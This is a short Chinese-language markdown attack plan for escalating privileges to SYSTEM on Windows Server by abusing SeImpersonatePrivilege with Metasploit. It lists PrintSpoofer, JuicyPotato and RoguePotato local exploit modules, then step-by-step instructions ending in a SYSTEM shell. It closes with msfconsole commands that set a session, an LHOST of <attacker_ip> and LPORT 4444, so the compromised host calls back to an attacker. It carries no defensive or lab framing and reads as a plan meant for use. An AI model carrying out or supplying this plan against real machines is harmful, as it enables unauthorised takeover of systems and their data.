# Metasploit攻击计划

## 🎯 目标
使用Metasploit利用SeImpersonatePrivilege提权到SYSTEM

## 💡 可用Exploit

### 1. PrintSpoofer (Windows)
- **模块**: exploit/windows/local/printspoofer
- **要求**: SeImpersonatePrivilege
- **目标**: Windows Server 2019

### 2. JuicyPotato (Windows)
- **模块**: exploit/windows/local/juicy_potato
- **要求**: SeImpersonatePrivilege
- **目标**: Windows Server 2016/2019

### 3. RoguePotato (Windows)
- **模块**: exploit/windows/local/rogue_potato
- **要求**: SeImpersonatePrivilege
- **目标**: Windows Server 2019

## 🎯 执行步骤

1. 检查Metasploit是否安装
2. 如果没有，安装Metasploit
3. 创建handler接收shell
4. 使用exploit提权
5. 获取SYSTEM shell

## 📝 命令示例

```bash
# 启动Metasploit
msfconsole

# 使用PrintSpoofer
use exploit/windows/local/printspoofer
set SESSION 1
set LHOST <attacker_ip>
set LPORT 4444
exploit
```
